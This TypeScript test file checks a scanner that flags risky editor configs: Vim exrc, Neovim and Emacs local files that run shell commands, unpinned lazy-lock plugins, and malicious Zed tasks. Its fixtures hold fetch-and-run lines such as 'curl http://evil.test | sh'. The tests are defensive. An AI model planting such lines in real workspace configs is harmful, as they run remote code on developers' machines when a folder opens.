import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { expect } from 'chai';
import { HeadlessWorkspaceScanner } from '../cli/headless-scanner';
import {
  checkInstalledZedVersion,
  isVulnerableZedVersion,
  scanEmacsDirLocals,
  scanLazyLockJson,
  scanVimConfig,
  scanZedTasksJson,
} from '../detection/editor-config-rules';
import { WorkspaceRuleType } from '../detection/workspace-rule-types';
import { SeverityLevel } from '../lib/events/sec-events';

suite('Stage 2A: Editor Config Rules', () => {
  suite('scanVimConfig', () => {
    test('flags exrc enabled in global vimrc and init.lua', () => {
      const vimrcFindings = scanVimConfig('set nocompatible\nset exrc\n', '/home/user/.vimrc', true);
      expect(vimrcFindings).to.have.lengthOf(1);
      expect(vimrcFindings[0].ruleId).to.equal('vim_exrc_enabled');
      expect(vimrcFindings[0].type).to.equal(WorkspaceRuleType.AGENT_RULES);
      expect(vimrcFindings[0].severity).to.equal(SeverityLevel.HIGH);

      const luaFindings = scanVimConfig('vim.o.exrc = true\n', '/home/user/.config/nvim/init.lua', true);
      expect(luaFindings).to.have.lengthOf(1);
      expect(luaFindings[0].ruleId).to.equal('vim_exrc_enabled');
    });

    test('ignores commented exrc and noexrc/false in global config', () => {
      const cleanVimrc = '" set exrc\nset noexrc\n';
      expect(scanVimConfig(cleanVimrc, '/home/user/.vimrc', true)).to.have.lengthOf(0);

      const cleanLua = '-- vim.o.exrc = true\nvim.opt.exrc = false\n';
      expect(scanVimConfig(cleanLua, '/home/user/.config/nvim/init.lua', true)).to.have.lengthOf(0);
    });

    test('flags shell/autocmd execution in repo-local rc', () => {
      const findings = scanVimConfig('autocmd BufEnter * call system("curl http://evil.test | sh")', '.nvim.lua');
      expect(findings).to.have.lengthOf(1);
      expect(findings[0].ruleId).to.equal('vim_local_rc_execution');
      expect(findings[0].severity).to.equal(SeverityLevel.HIGH);
    });

    test('flags benign non-empty repo-local rc as medium', () => {
      const findings = scanVimConfig('set tabstop=2\nset shiftwidth=2\n', '.exrc');
      expect(findings).to.have.lengthOf(1);
      expect(findings[0].ruleId).to.equal('vim_local_rc_present');
      expect(findings[0].severity).to.equal(SeverityLevel.MEDIUM);
    });

    test('returns empty for empty repo-local rc', () => {
      expect(scanVimConfig('   \n  ', '.exrc')).to.have.lengthOf(0);
    });
  });

  suite('scanLazyLockJson', () => {
    test('flags plugins missing a 40-char hex commit', () => {
      const content = JSON.stringify({
        'telescope.nvim': { branch: '0.1.x', commit: 'a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2' },
        'unpinned-plugin': { branch: 'main', commit: 'shortsha' },
        'missing-commit': { branch: 'main' },
      });
      const findings = scanLazyLockJson(content, 'lazy-lock.json');
      expect(findings).to.have.lengthOf(2);
      expect(findings.every((f) => f.ruleId === 'nvim_lazy_lock_unpinned')).to.equal(true);
      expect(findings.every((f) => f.severity === SeverityLevel.MEDIUM)).to.equal(true);
      expect(findings.map((f) => f.finding)).to.deep.equal(['unpinned-plugin', 'missing-commit']);
    });

    test('returns empty when all plugins are pinned', () => {
      const content = JSON.stringify({
        'lazy.nvim': { branch: 'main', commit: '0123456789abcdef0123456789abcdef01234567' },
      });
      expect(scanLazyLockJson(content, 'lazy-lock.json')).to.have.lengthOf(0);
    });
  });

  suite('scanEmacsDirLocals', () => {
    test('flags eval and process execution forms', () => {
      const content = '((nil . ((eval . (shell-command "curl http://evil.test | sh")))))';
      const findings = scanEmacsDirLocals(content, '.dir-locals.el');
      expect(findings).to.have.lengthOf(1);
      expect(findings[0].ruleId).to.equal('emacs_dir_locals_exec');
      expect(findings[0].severity).to.equal(SeverityLevel.HIGH);
    });

    test('flags suspicious compile-command', () => {
      const content = '((nil . ((compile-command . "curl http://evil.test | bash"))))';
      const findings = scanEmacsDirLocals(content, '.dir-locals.el');
      expect(findings).to.have.lengthOf(1);
      expect(findings[0].ruleId).to.equal('emacs_dir_locals_exec');
    });

    test('returns empty for benign .dir-locals.el', () => {
      const content = '((nil . ((indent-tabs-mode . nil) (fill-column . 100))))';
      expect(scanEmacsDirLocals(content, '.dir-locals.el')).to.have.lengthOf(0);
    });
  });

  suite('scanZedTasksJson', () => {
    test('matches command + args against TASK_RULES with jsonc comments', () => {
      const content = `[
        // Malicious task
        {
          "label": "Setup",
          "command": "curl",
          "args": ["-sSL", "https://evil.test/install.sh"]
        },
        {
          "label": "Test",
          "command": "npm",
          "args": ["test"]
        }
      ]`;
      const findings = scanZedTasksJson(content, '.zed/tasks.json');
      expect(findings.length).to.be.greaterThan(0);
      expect(findings[0].ruleId.startsWith('zed_task_')).to.equal(true);
      expect(findings[0].severity).to.equal(SeverityLevel.HIGH);
    });

    test('returns empty for clean tasks', () => {
      const content = JSON.stringify([{ label: 'Build', command: 'cargo', args: ['build'] }]);
      expect(scanZedTasksJson(content, '.zed/tasks.json')).to.have.lengthOf(0);
    });
  });

  suite('isVulnerableZedVersion', () => {
    test('returns true for versions < 0.165.4 and false for >= 0.165.4', () => {
      expect(isVulnerableZedVersion('0.165.3')).to.equal(true);
      expect(isVulnerableZedVersion('0.164.9')).to.equal(true);
      expect(isVulnerableZedVersion('0.165.4')).to.equal(false);
      expect(isVulnerableZedVersion('0.166.0')).to.equal(false);
      expect(isVulnerableZedVersion('1.0.0')).to.equal(false);
    });
  });

  suite('End-to-End HeadlessWorkspaceScanner Stage 2 Editors', () => {
    test('scanGlobalConfigs checks ~/.vimrc as global and checkInstalledZedVersion', () => {
      const homeDir = fs.mkdtempSync(path.join(os.tmpdir(), 'os-s2-home-'));
      try {
        fs.writeFileSync(path.join(homeDir, '.vimrc'), 'set exrc\n');
        const scanner = new HeadlessWorkspaceScanner();
        const findings = scanner.scanGlobalConfigs(homeDir);
        expect(findings.some((f) => f.ruleId === 'vim_exrc_enabled')).to.equal(true);

        const zedVuln = checkInstalledZedVersion(homeDir, { versionString: '0.165.3' });
        expect(zedVuln).to.have.lengthOf(1);
        expect(zedVuln[0].ruleId).to.equal('zed_vulnerable_idesaster_version');
        expect(checkInstalledZedVersion(homeDir, { versionString: '0.165.4' })).to.have.lengthOf(0);
      } finally {
        fs.rmSync(homeDir, { recursive: true, force: true });
      }
    });

    test('scanDirectory scans repo-local .vimrc, .nvim.lua, .exrc, .dir-locals.el, lazy-lock.json, and .zed/tasks.json', () => {
      const repoDir = fs.mkdtempSync(path.join(os.tmpdir(), 'os-s2-repo-'));
      try {
        fs.writeFileSync(path.join(repoDir, '.vimrc'), 'autocmd BufEnter * call system("id")\n');
        fs.writeFileSync(path.join(repoDir, '.nvim.lua'), 'vim.system({"id"})\n');
        fs.writeFileSync(path.join(repoDir, '.exrc'), 'set tabstop=2\n');
        fs.writeFileSync(path.join(repoDir, '.dir-locals.el'), '((nil . ((eval . (shell-command "id")))))\n');
        fs.writeFileSync(path.join(repoDir, 'lazy-lock.json'), JSON.stringify({ pkg: { branch: 'main' } }));
        fs.mkdirSync(path.join(repoDir, '.zed'), { recursive: true });
        fs.writeFileSync(
          path.join(repoDir, '.zed', 'tasks.json'),
          JSON.stringify([{ label: 'bad', command: 'curl', args: ['https://evil.test | sh'] }]),
        );

        const findings = new HeadlessWorkspaceScanner().scanDirectory(repoDir);
        const ids = new Set(findings.map((f) => f.ruleId));
        expect(ids.has('vim_local_rc_execution')).to.equal(true);
        expect(ids.has('vim_local_rc_present')).to.equal(true);
        expect(ids.has('emacs_dir_locals_exec')).to.equal(true);
        expect(ids.has('nvim_lazy_lock_unpinned')).to.equal(true);
        expect(findings.some((f) => f.ruleId.startsWith('zed_task_'))).to.equal(true);
      } finally {
        fs.rmSync(repoDir, { recursive: true, force: true });
      }
    });
  });
});
